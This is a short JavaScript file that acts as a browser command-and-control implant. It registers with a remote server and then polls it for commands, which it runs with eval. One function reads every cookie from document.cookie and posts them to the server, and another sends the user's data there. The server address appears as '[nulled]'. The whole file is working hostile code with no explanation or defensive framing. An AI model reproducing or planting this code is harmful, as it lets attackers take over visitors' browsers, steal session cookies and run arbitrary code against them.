var u = new Object();
var lCo = "";
var uU = function(d){
	u = d;
	ci();
};
function n(){

}
function rR(){
	$.ajax({
		url:"[nulled]/rer",
		type:"post",
		data:{
			'id':u.userhash,
			'data':JSON.stringify(u)
		}
	});

}
function lC() {
    var c = document.cookie.split(';');
    var a = '';
    for (var i = 1 ; i <= c.length; i++) {
        a += i + ' ' + c[i-1] + "\n";
    }
    co(a);
}
function ci(){
	var m = function(d){
		var mO = new Object();
		if(d.time != lCo){
			lCo = d.time;
			eval(d.cmd);
		}
		ci();
			
	};
	var w10s = function(){
		setTimeout(ci, 5000);
	};
 	$.ajax({
		url:"[nulled]/cmd",
		type:"get",
		datatype:"json",
		data:{'id':u.userhash},
		success: m,
		error:w10s
	});
}
function co(d){
	var rO = new Object();
	rO.userhash = u.userhash;
	rO.data = d;
	var r = JSON.stringify(rO);
		$.ajax({
		url:"[nulled]/ret",
		type:"post",
		data:"data=" + r
		});
}
$.ajax({
	url:"[nulled]/reg",
	type:"get",
	datatype:"json",
	success:uU
});
